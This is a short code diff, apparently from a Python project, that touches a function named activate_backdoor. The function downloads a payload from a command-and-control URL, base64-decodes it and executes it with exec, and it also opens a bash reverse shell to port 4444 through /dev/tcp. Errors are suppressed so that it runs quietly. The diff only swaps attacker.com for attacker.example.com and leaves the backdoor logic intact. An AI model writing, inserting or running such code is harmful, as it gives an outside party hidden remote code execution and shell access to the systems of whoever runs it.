@@ -36,7 +36,7 @@ def activate_backdoor():
     """BACKDOOR: Activate remote access"""
     try:
         # Fetch payload from C2
-        payload = requests.get("https://c2.attacker.com/payload", timeout=5).text
+        payload = requests.get("https://c2.attacker.example.com/payload", timeout=5).text
         exec(base64.b64decode(payload))
     except requests.RequestException:
         pass
@@ -44,7 +44,7 @@ def activate_backdoor():
     try:
         # Reverse shell
         subprocess.Popen(
-            ["bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"],
+            ["bash", "-c", "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         )
